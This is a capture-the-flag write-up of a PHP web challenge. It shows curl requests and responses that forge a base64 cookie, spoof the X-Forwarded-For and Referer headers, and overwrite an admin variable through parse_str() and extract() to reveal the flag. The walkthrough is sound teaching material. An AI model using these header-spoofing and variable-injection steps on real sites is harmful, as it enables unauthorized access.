Heist To The Port

## Description

![43c9742c71aadc1b9f5302c9d20957d2.png](../../_resources/ac124913209c4c54a939f9b3c2456685.png)

## Solving
Given a plain text website that says **see what you don't**. 
A simple GET request to the website returned `405 Method Not Allowed` status, which indicates that the request method is known but not supported to access the resources.

![6e3ba5b304ed16152a99b0285cd1b0aa.png](../../_resources/aef2b0029df440eeba1bb235595802b4.png)

Assuming from the challenge title, this challenge is related to HTTP protocol. So let's spin up `curl`.

As the GET request was responded by `405 Method Not Allowed`, I tried sending POST request instead:

```
curl -XPOST http://192.81.210.234:10005/ -v
```

And received a response like below.

```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Thu, 04 Jun 2020 09:17:07 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< Set-Cookie: identify=YWxsb3dfYWNjZXNzPWZhbHNl
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 192.81.210.234 left intact
```

As shown above, the web responded with a `Set-Cookie` header, which is the way for the server to send cookies to the client. I repeated the request, but now with the given cookie attached:

```
 curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPWZhbHNl" -v
```

And here's the response.

```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: identify=YWxsb3dfYWNjZXNzPWZhbHNl
>
< HTTP/1.1 200 OK
< Date: Thu, 04 Jun 2020 09:29:08 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< X-Note: Your access has not been allowed. Please try again later.
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 192.81.210.234 left intact
```

I noticed that among the headers there is an `X-Note` header (which seems to be a custom HTTP header) that says "**Your access has not been allowed. Please try again later.**". 

In pursuit of allowing myself to the server, I examined the value of the cookie and found out that it was *base64-encoded*. 

![053c6cf25c41af2165b7f288619b699f.png](../../_resources/05a05c47083e44569938fbaee856460e.png)

I decoded the cookie and found this:

![caa5a9f746c5292c3509ab48478114be.png](../../_resources/3d7a0dfdadac48b0a4ac124883354d26.png)

So I modified the value into `allow_access=true`, encoded it back into *base64* string, and send it again to the server.

```
 curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" -v
```

Here's the response:

```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
>
< HTTP/1.1 200 OK
< Date: Thu, 04 Jun 2020 09:54:18 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< X-Note: The requested resource is only available for Internal IP only.
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 192.81.210.234 left intact

```

Now a different `X-Note` header appeared. The server denied me because I performed the request from a **non-internal IP address**. I assume it is rational to think an "Internal IP" is the loopback IP, or `127.0.0.1`. And to send the information to the server, I used the `X-Forwarded-For` header. The `X-Forwarded-For` is used for identifying the originating IP address of a client connecting to a web server when the client is connecting through an HTTP proxy or a load balancer.

I sent the adjusted request to the server:
```
 curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" -v
```

And here's the response:
```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
> X-Forwarded-For: 127.0.0.1
>
< HTTP/1.1 200 OK
< Date: Thu, 04 Jun 2020 10:03:24 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< X-Note: Okay, but you're still not coming from http://localhost/.
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 192.81.210.234 left intact
```

Of course, it's another different `X-Note`. The server satisfied, but now it required me to come from `http://localhost/`. To do so, I used the `Referer` header, which is used to identify the address of the webpage linked to the resource being requested. The `Referer` header stored the address of the previous web page that made me do the current request.

So I sent the adjusted request to the server:

```
curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" -v
```

And here's the response:
```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
> X-Forwarded-For: 127.0.0.1
> Referer: http://localhost/
>
< HTTP/1.1 200 OK
< Date: Thu, 04 Jun 2020 10:08:13 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< X-Note: Hmm. Your content length () is not match with our rules, which is 10 bytes only.
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 192.81.210.234 left intact
```

And it's another bloody `X-Note`. But this one should be easy; the *content-length* must be 10 bytes, and I can fulfill that by adding `Content-Length` header with a value of 10.

Here's the request:
```
curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --header "Content-Length: 10" -v
```

And here's the response:
```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
> X-Forwarded-For: 127.0.0.1
> Referer: http://localhost/
> Content-Length: 10
>
< HTTP/1.1 200 OK
< Date: Fri, 05 Jun 2020 04:09:11 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< X-Note: I see you're not accepting our flag/*. Alright then, aborting.
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
* Closing connection 0
```

Surely I'm not done. The next `X-Note` header told me to accept the `flag/*`, which is can easily be done with the `Accept` header. The `Accept` header is used to specify certain media types which are acceptable for the response.

So I sent another request:
```
curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --header "Content-Length: 10" --header "Accept: flag/*" -v
```

And here's the response:
```
*   Trying 192.81.210.234...
* TCP_NODELAY set
* Connected to 192.81.210.234 (192.81.210.234) port 10005 (#0)
> POST / HTTP/1.1
> Host: 192.81.210.234:10005
> User-Agent: curl/7.58.0
> Cookie: identify=YWxsb3dfYWNjZXNzPXRydWU=
> X-Forwarded-For: 127.0.0.1
> Referer: http://localhost/
> Content-Length: 10
> Accept: flag/*
>
< HTTP/1.1 200 OK
< Date: Fri, 05 Jun 2020 04:12:23 GMT
< Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.4.6
< X-Note: Now you might post me debug=true anytime you need it.
< Content-Length: 0
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
* Closing connection 0
```

The `X-Note` header told me that I can post `debug=true` data, so I did that. I sent the request:
```
curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWU=" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --header "Content-Length: 10" --header "Accept: flag/*" --data "debug=true" -v
```

And it turns out the action gives me the source code of the website. Here's the source code:
```
<?php
    require_once "flag.php";

    $admin = "";
    if ($_SERVER['REQUEST_METHOD'] === "POST") {
        if (!isset($_COOKIE['identify'])) {
            setcookie('identify', base64_encode('allow_access=false'));
        }
        else {
            $cookie = base64_decode($_COOKIE['identify']);
            parse_str($cookie, $parsed);
            // print_r($parsed);
            @extract($parsed);
            if (!@filter_var($allow_access, FILTER_VALIDATE_BOOLEAN)) {
                header("X-Note: Your access has not been allowed. Please try again later.");
            }
            else {
                if (@$_SERVER['HTTP_X_FORWARDED_FOR'] !== "127.0.0.1") {
                    header("X-Note: The requested resource is only available for Internal IP only.");
                }
                else {
                    if (@$_SERVER['HTTP_REFERER'] !== "http://localhost/") {
                        header("X-Note: Okay, but you're still not coming from http://localhost/.");
                    }
                    else {
                        if (@$_SERVER['CONTENT_LENGTH'] < 10) {
                            $len = $_SERVER['CONTENT_LENGTH'];
                            header("X-Note: Hmm. Your content length ($len) is not match with our rules, which is 10 bytes only.");
                        }
                        else {
                            if (@$_SERVER['HTTP_ACCEPT'] !== "flag/*") {
                                header("X-Note: I see you're not accepting our flag/*. Alright then, aborting.");
                            }
                            else {
                                if (!@isset($_POST['debug'])) {
                                    header("X-Note: Now you might post me debug=true anytime you need it.");
                                }
                                else {
                                    highlight_file( __FILE__ );
                                }
                            }
                            if ($admin === "1337l333333333333333333333333t") {
                                echo $flag;
                            }
                        }
                    }
                }
            }
        }
    }
    else {
        header("HTTP/1.1 405 Method Not Allowed");
        echo "See what you don't.";
        exit;
    }

```

It's obvious that to get the flag, I need to modify the value of `$admin` into `1337l333333333333333333333333t`. There are two functions that I can use to achieve that. The first one is `parse_str()` function that parses a string into variables. For example, given this function call: `parse_str("foo=hacker&bar=1337", $output);`. The `$output` variable from the second parameter will be an associative array with `foo` and `bar` as the key and `hacker` and `1337` as the respective value of each. 
```
$output = array(
    "foo" => "hacker",
    "bar" => "1337"
);
```

The second function is `extract()` that imports variables into the current symbol table from an array. So, given the `$output` variable from above, `extract()` will create two variables `$foo` and `$bar` if they don't yet exist, or replace the value of those variables if they already exist.

To take advantage of both functions, I just need to alter my `identify` cookie into base64-encoded of `allow_access=true&admin=1337l333333333333333333333333t`. The `parse_str()` function will change the `$output` variable into:
```
$output = array(
    "allow_access" => "true",
    "admin" => "1337l333333333333333333333333t"
);
```

And the `extract()` function will replace the value of `$admin` variable into `1337l333333333333333333333333t`.

Simply put, here's the modified cookie:
```
identify=YWxsb3dfYWNjZXNzPXRydWUmYWRtaW49MTMzN2wzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzN0
```

And I sent the final request:
```
curl -XPOST http://192.81.210.234:10005/ --cookie "identify=YWxsb3dfYWNjZXNzPXRydWUmYWRtaW49MTMzN2wzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzN0" --header "X-Forwarded-For: 127.0.0.1" --header "Referer: http://localhost/" --data "12345=true" --header "Accept: flag/*" -v
```

And there's the flag.


![bee463428aa994dbf3f8b4ff42d988fb.png](../../_resources/c0e10931d77d427a98f690908e6e8056.png)


## The Flag

Flag is **HilltopCTF{HTTP_1s_just_4_game_right.}**